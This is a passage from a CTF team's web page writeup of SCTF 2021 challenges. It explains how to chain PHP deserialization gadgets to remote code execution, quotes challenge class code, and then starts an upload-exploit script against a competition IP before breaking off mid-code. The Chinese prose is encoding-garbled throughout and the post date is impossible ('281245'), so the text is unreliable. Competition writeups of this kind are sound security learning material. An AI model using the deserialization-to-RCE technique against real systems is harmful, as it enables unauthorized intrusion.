<!doctype html><html lang=en itemscope itemtype=http://schema.org/WebPage><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>2021 SCTF SU Writeup -</title><meta name=description content="æœ¬æ¬¡2021 SCTF æˆ‘ä»¬ SU å–å¾—äº†2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2021 SCTFçš„ writeup"><meta name=author content="SUer"><script type=application/ld+json>{"@context":"http://schema.org","@type":"WebSite","name":"su-team","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Organization","name":"","url":"https:\/\/su-team.cn\/"}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/su-team.cn\/","name":"home"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/su-team.cn\/post\/sctf-2021-su-wu\/","name":"2021 sctf su writeup"}}]}</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"Article","author":{"name":"SUer"},"headline":"2021 SCTF SU Writeup","description":"æœ¬æ¬¡2021 SCTF æˆ‘ä»¬ SU å–å¾—äº†2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770) ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2021 SCTFçš„ writeup\n","inLanguage":"en","wordCount":10826,"datePublished":"2021-12-28T08:36:45\u002b00:00","dateModified":"2021-12-28T08:36:45\u002b00:00","image":"https:\/\/su-team.cn\/img\/SU.jpg","keywords":["SCTF"],"mainEntityOfPage":"https:\/\/su-team.cn\/post\/sctf-2021-su-wu\/","publisher":{"@type":"Organization","name":"https:\/\/su-team.cn\/","logo":{"@type":"ImageObject","url":"https:\/\/su-team.cn\/img\/SU.jpg","height":60,"width":60}}}</script><meta property="og:title" content="2021 SCTF SU Writeup"><meta property="og:description" content="æœ¬æ¬¡2021 SCTF æˆ‘ä»¬ SU å–å¾—äº†2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2021 SCTFçš„ writeup"><meta property="og:image" content="https://su-team.cn/img/SU.jpg"><meta property="og:url" content="https://su-team.cn/post/sctf-2021-su-wu/"><meta property="og:type" content="website"><meta property="og:site_name" content="su-team"><meta name=twitter:title content="2021 SCTF SU Writeup"><meta name=twitter:description content="æœ¬æ¬¡2021 SCTF æˆ‘ä»¬ SU å–å¾—äº†2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼šsuers_xctf@126.comæˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2021 SCTFçš„ writeup"><meta name=twitter:image content="https://su-team.cn/img/SU.jpg"><meta name=twitter:card content="summary_large_image"><link href=https://su-team.cn/img/SU.jpg rel=icon type=image/x-icon><meta name=generator content="Hugo 0.148.2"><link rel=alternate href=https://su-team.cn/index.xml type=application/rss+xml title=su-team><link rel=stylesheet href=https://su-team.cn/css/katex.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/brands.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/fontawesome.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/regular.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/solid.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/svg-with-js.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-font-face.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v4-shims.min.css><link rel=stylesheet href=https://su-team.cn/fontawesome/css/v5-font-face.min.css><link rel=stylesheet href=https://su-team.cn/css/bootstrap.min.css><link rel=stylesheet href=https://su-team.cn/css/main.css><link rel=stylesheet href=https://su-team.cn/css/fonts.css><link rel=stylesheet href=https://su-team.cn/css/syntax.css><link rel=stylesheet href="https://su-team.cn/css/codeblock.css?v=20260212-fix3"><link rel=stylesheet href=https://su-team.cn/css/photoswipe.min.css><link rel=stylesheet href=https://su-team.cn/css/photoswipe.default-skin.min.css><style>.navbar-custom .avatar-container{width:58px;height:58px;margin-top:-29px;left:50%;transform:translateX(-50%);display:flex;align-items:center;justify-content:center;background:#fff;border-radius:50%;box-shadow:0 6px 18px rgba(0,0,0,.12)}.navbar-custom .avatar-container .avatar-img-border{width:100%;height:100%;border-radius:50%;overflow:hidden;margin:0;box-shadow:none}.navbar-custom .avatar-container .avatar-img{width:100%;height:100%;object-fit:cover;border-radius:50%}@media only screen and (min-width:768px){.navbar-custom .avatar-container{width:72px;height:72px;margin-top:-36px}}</style></head><body><nav class="navbar navbar-default navbar-fixed-top navbar-custom"><div class=container-fluid><div class=navbar-header><button type=button class=navbar-toggle data-toggle=collapse data-target=#main-navbar>
<span class=sr-only>Toggle navigation</span>
<span class=icon-bar></span>
<span class=icon-bar></span>
<span class=icon-bar></span>
</button>
<a class="theme-toggle mobile-theme-toggle" href=javascript:void(0) onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</a><a class=navbar-brand href=https://su-team.cn/>su-team</a></div><div class="collapse navbar-collapse" id=main-navbar><ul class="nav navbar-nav navbar-right"><li><a title=Archives href=/>Archives</a></li><li class=navlinks-container><a class=navlinks-parent role=button tabindex=0>Members</a><div class=navlinks-children><a href=/active-members>Members</a>
<a href=/pioneers>Pioneers</a></div></li><li><a title=About href=/page/about/>About</a></li><li><a title=Tags href=/tags>Tags</a></li><li class=hidden-xs><a href=javascript:void(0) class=theme-toggle onclick=toggleTheme() title="Toggle Theme"><span class=sr-only>Toggle Theme</span>
<svg class="theme-icon-moon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg class="theme-icon-sun" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></a></li></ul></div></div></nav><script>(function(){const e=localStorage.getItem("theme"),t=window.matchMedia("(prefers-color-scheme: dark)").matches;e==="dark"||!e&&t?document.body.classList.add("dark-mode"):document.body.classList.remove("dark-mode")})();function toggleTheme(){const e=document.body;e.classList.toggle("dark-mode"),e.classList.contains("dark-mode")?localStorage.setItem("theme","dark"):localStorage.setItem("theme","light")}</script><style>.theme-toggle{cursor:pointer;padding:15px;display:flex;align-items:center}.mobile-theme-toggle{float:right;padding:15px 10px;margin-top:2px}@media(min-width:768px){.mobile-theme-toggle{display:none !important}}.theme-icon-moon,.theme-icon-sun{color:#777;transition:color .3s,transform .3s}.theme-toggle:hover .theme-icon-moon,.theme-toggle:hover .theme-icon-sun{color:#333}.theme-icon-sun{display:none}.theme-icon-moon{display:block}body.dark-mode .theme-icon-sun{display:block;color:#000}body.dark-mode .theme-icon-moon{display:none}body.dark-mode{filter:none !important;background-color:#1a1a1a !important}body.dark-mode header,body.dark-mode .container,body.dark-mode footer{filter:invert(1)hue-rotate(180deg)}body.dark-mode .navbar-custom{background-color:#1a1a1a !important;border-bottom:1px solid #333}body.dark-mode .navbar-custom .container-fluid{filter:invert(1)hue-rotate(180deg)}body.dark-mode img,body.dark-mode video,body.dark-mode iframe,body.dark-mode .avatar-img,body.dark-mode .navbar-custom .avatar-container{filter:invert(1)hue-rotate(180deg)}</style><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><header class=header-section><div class="intro-header no-img"><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><div class=post-heading><h1>2021 SCTF SU Writeup</h1><span class=post-meta><i class="fas fa-calendar"></i>&nbsp;Posted on December 28, 281245
&nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;51&nbsp;min
&nbsp;|&nbsp;<i class="fas fa-book"></i>&nbsp;10826&nbsp;words
&nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;SUer</span></div></div></div></div></div></header><div class=container role=main><div class="row flex-row"><div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 hidden-sm hidden-xs"><div class=toc-sidebar><h4 class=toc-title>#<br>TABLE OF CONTENTS</h4><div class=toc-card><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><ul><li><a href=#fumo_on_the_christmas_tree>FUMO_on_the_Christmas_tree</a></li><li><a href=#upload_it>Upload_it</a></li><li><a href=#loginme>Loginme</a></li><li><a href=#ezuros>Ezuros</a></li><li><a href=#rceme>Rceme</a></li><li><a href=#upload-it-2>upload it 2</a></li><li><a href=#goftp>GoFTP</a></li></ul></li></ul></li><li><a href=#misc>Misc</a><ul><li><ul><li><a href=#this_is_a_tree>This_is_A_tree</a></li><li><a href=#fumo_xor_cli>fumo_xor_cli</a></li><li><a href=#in_the_vaporwaves>in_the_vaporwaves</a></li><li><a href=#easydsp>easydsp</a></li><li><a href=#easyiot>easyiot</a></li></ul></li></ul></li><li><a href=#pwn>Pwn</a><ul><li><ul><li><a href=#dataleak>dataleak</a></li><li><a href=#flyingkernel>flyingkernel</a></li><li><a href=#christmas-wishes>Christmas Wishes</a></li><li><a href=#christmas-song>Christmas Song</a></li><li><a href=#christmas-bash>Christmas Bash</a></li><li><a href=#gadget>Gadget</a></li><li><a href=#checkin-ret2text>CheckIn ret2text</a></li></ul></li></ul></li><li><a href=#crypto>Crypto</a><ul><li><ul><li><a href=#ciruit-map>ciruit map</a></li><li><a href=#cubic>cubic</a></li></ul></li></ul></li><li><a href=#rev>Rev</a><ul><li><ul><li><a href=#sycgame><strong>SycGame</strong></a></li><li><a href=#sycos><strong>SycOS</strong></a></li><li><a href=#godness-dance>godness dance</a></li><li><a href=#cplusexceptionencrypt><strong>CplusExceptionEncrypt</strong></a></li></ul></li></ul></li></ul></nav></div></div></div><div class="col-lg-9 col-md-9"><article role=main class=blog-post><p>æœ¬æ¬¡2021 SCTF æˆ‘ä»¬ SU å–å¾—äº†2nd ğŸ¥ˆçš„æˆç»©ï¼Œæ„Ÿè°¢é˜Ÿé‡Œå¸ˆå‚…ä»¬çš„è¾›è‹¦ä»˜å‡ºï¼åŒæ—¶æˆ‘ä»¬ä¹Ÿåœ¨æŒç»­æ‹›äººï¼Œåªè¦ä½ æ‹¥æœ‰ä¸€é¢—çƒ­çˆ± CTF çš„å¿ƒï¼Œéƒ½å¯ä»¥åŠ å…¥æˆ‘ä»¬ï¼æ¬¢è¿å‘é€ä¸ªäººç®€ä»‹è‡³ï¼š<a href=mailto:suers_xctf@126.com>suers_xctf@126.com</a>æˆ–ç›´æ¥è”ç³»ä¹¦é±¼(QQ:381382770)
ä»¥ä¸‹æ˜¯æˆ‘ä»¬ SU æœ¬æ¬¡ 2021 SCTFçš„ writeup</p><h1 id=web>Web</h1><h3 id=fumo_on_the_christmas_tree>FUMO_on_the_Christmas_tree</h3><p>é€šè¿‡ç»™å®šçš„ä¸€ä¸ª gadget class æ–‡ä»¶æ¥è¿›è¡Œ PHP ååºåˆ—åŒ– RCEã€‚è§‚å¯Ÿåå‘ç°åªæœ‰ä¸€ä¸ªç±»æœ‰ destructorï¼Œç„¶åæ‰€æœ‰å’Œç³»ç»Ÿäº’åŠ¨çš„å‡½æ•°åªæœ‰ readfileï¼Œæ‰€ä»¥è¿™åº”è¯¥å°±æ˜¯å…¥å£å’Œå‡ºå£ã€‚å‰©ä¸‹çš„åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨è·¯å¾„ä»å…¥å£åˆ°å‡ºå£ã€‚</p><p>æ‰€æœ‰çš„ç±»éƒ½åªæœ‰ä¸€ä¸ªå‡½æ•°å’Œä¸€äº›æˆå‘˜å˜é‡ã€‚å‡½æ•°å†…éƒ¨åšçš„æ“ä½œå¤§æ¦‚åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li>å¯¹è¾“å…¥ç”¨å‡½æ•°åšä¸€äº›å˜æ¢</li><li>è°ƒç”¨å…¶å®ƒç±»çš„æˆå‘˜å‡½æ•°</li></ul><p>æˆ‘ä»¬å…ˆçœ‹æ‰€æœ‰å¯¹è¾“å…¥åšå˜æ¢çš„å‡½æ•°ã€‚å…¶ä¸­æœ‰</p><ol><li><code>crypt</code>ã€<code>sha1</code>ã€<code>md5</code></li><li><code>base64_encode</code></li><li><code>str_rot13</code>ã€<code>strrev</code>ã€<code>ucfirst</code>ã€<code>base64_decode</code></li></ol><p>ç¬¬ä¸€ç±»æ˜¯ä¸å¯é€†çš„ï¼Œå¿…é¡»é¿å…é‡åˆ°ï¼›ç¬¬äºŒç±»æ˜¯å¯é€†çš„ï¼Œä½†å¿…é¡»æ»¡è¶³æ¡ä»¶ï¼Œåªæœ‰åœ¨ <code>base64_encode</code> åå†å‡ºç°ä¸€ä¸ª <code>base64_decode</code> æ‰è¡Œï¼Œå¹¶ä¸”ä¸¤è€…ä¸­é—´çš„æ“ä½œå¿…é¡»æœ€ç»ˆä¿è¯æ•°æ®ä¸€è‡´ï¼›ç¬¬ä¸‰ç±»æ˜¯å®Œå…¨å¯é€†çš„ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œæœ‰çš„é‡Œé¢è¿˜ä¼šå‡ºç°ç›´æ¥çš„èµ‹å€¼è¯­å¥ï¼Œæ¯”å¦‚ <code>$xxx = $yyy</code>ã€‚å¦‚æœæ˜¯ <code>$xxx = $xxx</code>ï¼ˆè‡ªå·±èµ‹ç»™è‡ªå·±ï¼‰çš„ç±»å‹åˆ™å¯ä»¥ï¼Œå¦åˆ™çš„è¯åˆ™éœ€è¦é¿å…é‡åˆ°ï¼ˆå› ä¸ºå³ä¾§çš„å˜é‡ä¸å­˜åœ¨ï¼‰ã€‚</p><p>æ¥ä¸‹æ¥ï¼Œå¯¹äºæ‰€æœ‰çš„ç±»æˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªè°ƒç”¨å…³ç³»ã€‚ç±»é‡Œå‡½æ•°è°ƒç”¨çš„æ–¹å¼æœ‰å‡ ç§ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=c1>// ç¬¬ä¸€ç§
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>viqSfkeZ91</span><span class=p>(</span><span class=nv>$DUkiWcRS</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_callable</span><span class=p>([</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>pHnfXT0TP</span><span class=p>,</span> <span class=s1>&#39;T81ZgYZlGt&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>pHnfXT0TP</span><span class=o>-&gt;</span><span class=na>T81ZgYZlGt</span><span class=p>(</span><span class=nv>$DUkiWcRS</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ç¬¬äºŒç§
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(</span><span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nv>$key</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=s1>&#39;QThTQjRHWm1WRw==&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>BUDQkw</span><span class=o>-&gt;</span><span class=na>zvHrWpSd</span><span class=p>(</span><span class=nv>$value</span><span class=p>[</span><span class=nv>$key</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ç¬¬ä¸‰ç§
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>extract</span><span class=p>([</span><span class=nv>$name</span> <span class=o>=&gt;</span> <span class=s1>&#39;FTTh89A9u&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_callable</span><span class=p>([</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>IwXv56wBHu</span><span class=p>,</span> <span class=nv>$KDKR9Egl7</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>call_user_func</span><span class=p>([</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>IwXv56wBHu</span><span class=p>,</span> <span class=nv>$KDKR9Egl7</span><span class=p>],</span> <span class=o>...</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// ç¬¬å››ç§
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>ttcoBkt</span><span class=p>(</span><span class=nv>$a06sSms0Pd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>Z9vliIEZ9u</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;upGnwrVnpV&#39;</span> <span class=o>=&gt;</span> <span class=nv>$a06sSms0Pd</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>ç¬¬ä¸€ç§æ‰¾å“ªä¸ªç±»æœ‰<code>T81ZgYZlGt</code>ã€‚</li><li>ç¬¬äºŒç§æ‰¾å“ªä¸ªç±»æœ‰<code>zvHrWpSd</code>ã€‚</li><li>ç¬¬ä¸‰ç§éœ€è¦çœ‹<code>extract</code>é‡Œé¢çš„å‚æ•°ï¼Œæ‰¾åˆ°å“ªä¸ªç±»æœ‰<code>FTTh89A9u</code>ã€‚å¤„ç†çš„æ—¶å€™è¦æ³¨æ„ç¬¬ä¸‰ç§ç­‰ä»·äºç¬¬ä¸€ç§çš„å†™æ³•ï¼š</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-PHP data-lang=PHP><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>KDKR9Egl7</span><span class=p>(</span><span class=nv>$value</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_callable</span><span class=p>([</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>IwXv56wBHu</span><span class=p>,</span> <span class=s1>&#39;FTTh89A9u&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=o>@</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>IwXv56wBHu</span><span class=o>-&gt;</span><span class=na>FTTh89A9u</span><span class=p>(</span><span class=nv>$value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li>ç¬¬å››ç§åªèƒ½è°ƒç”¨ç¬¬äºŒç§ï¼Œéœ€è¦æ‰¾å“ªä¸ªç±»çš„<code>__invoke</code>å‡½æ•°çš„<code>base64_decode</code>çš„å‚æ•°æ˜¯<code>upGnwrVnpV</code>çš„ Base64 ç¼–ç å­—ç¬¦ä¸²ã€‚</li></ul><p>å¦‚æœä¸€ä¸ªç±»å¯ä»¥é€šè¿‡æŸç§æ–¹å¼ï¼ˆä¿è¯è¾“å…¥æ˜¯ä¸Šæ–‡æ‰€è¿°å¯é€†å˜åŒ–çš„æ¡ä»¶ä¸‹ï¼‰å¸¦ç€è¾“å…¥è°ƒç”¨å¦ä¸€ä¸ªç±»ï¼Œåˆ™å¯ä»¥ä»è¿™ä¸ªç±»åˆ°è¾¾å¦ä¸€ä¸ªç±»ã€‚é‚£æ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥åœ¨ä¸Šæ–‡å»ºç«‹å¥½è°ƒç”¨å…³ç³»çš„æƒ…å†µä¸‹ï¼Œåœ¨è¿™äº›ç±»ä¸Šï¼ˆçœ‹æˆä¸€ä¸ªå›¾ï¼‰ä»å…¥å£å¼€å§‹è¿›è¡Œ DFSï¼Œä¸­é—´è®°å½•ç»è¿‡çš„ç±»ã€å‡½æ•°å’Œå¯¹è¾“å…¥è¿›è¡Œçš„å˜æ¢ã€‚å¦‚æœèƒ½å¤Ÿåœ¨æ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„æƒ…å†µä¸‹åˆ°è¾¾å‡ºå£ï¼Œåˆ™æˆåŠŸæ‰¾åˆ°ä¸€æ¡è°ƒç”¨è·¯å¾„ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯ç”¨ç°æˆçš„ PHP è§£æåº“è§£ææ‰€æœ‰çš„ç±»ï¼Œæ„å»ºä¸Šè¿°å…³ç³»å¹¶ä¸”è·‘ç®—æ³•ï¼Œæœ€åå¾—å‡ºä¸€æ¡è·¯å¾„ï¼Œå†æ‰‹åŠ¨æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²å’Œè¾“å…¥å³å¯ã€‚</p><h3 id=upload_it>Upload_it</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://124.71.199.229:8778/&#34;</span>
</span></span><span class=line><span class=cl>
